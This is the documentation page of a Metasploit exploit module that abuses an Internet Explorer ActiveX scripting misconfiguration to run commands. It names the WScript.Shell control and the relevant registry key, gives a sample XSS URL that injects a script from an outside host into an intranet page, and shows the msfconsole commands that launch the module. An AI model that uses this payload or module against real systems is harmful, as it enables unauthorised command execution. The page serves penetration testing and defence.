## Microsoft Internet Explorer Unsafe Scripting Misconfiguration

This exploit takes advantage of the "Initialize and script 
ActiveX controls not marked safe for scripting" setting 
within Internet Explorer. When this option is set, IE allows 
access to the WScript.Shell ActiveX control, which allows 
javascript to interact with the file system and run 
commands. This security flaw is not uncommon in corporate 
environments for the 'Intranet' or 'Trusted Site' zones. 
When set via domain policy, the most common registry entry 
to modify is HKLM\ 
Software\Policies\Microsoft\Windows\CurrentVersion\Internet 
Settings\Zones\1\1201, which if set to '0' forces ActiveX 
controls not marked safe for scripting to be enabled for the 
Intranet zone. This module creates a javascript/html hybrid 
that will render correctly either via a direct GET 
http://msf-server/ or as a javascript include, such as in: 
http://intranet-server/xss.asp?id="><script%20src=http://10.10.10.10/ie_unsafe_script.js> 
</script>. IE Tabs, WScript and subsequent Powershell 
prompts all run as x86 even when run from an x64 
iexplore.exe.


## Module Name
exploit/windows/browser/ie_unsafe_scripting

## Authors
* natron
* Ben Campbell


## References
* http://support.microsoft.com/kb/182569
* http://blog.invisibledenizen.org/2009/01/ieunsafescripting-metasploit-module.html
* http://support.microsoft.com/kb/870669



## Targets
* Windows x86/x64


## Platforms
win

## Reliability
[Excellent](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use exploit/windows/browser/ie_unsafe_scripting
msf exploit(ie_unsafe_scripting) > show targets
   ... a list of targets ...
msf exploit(ie_unsafe_scripting) > set TARGET <target-id>
msf exploit(ie_unsafe_scripting) > show options
   ... show and set options ...
msf exploit(ie_unsafe_scripting) > run
```
    
    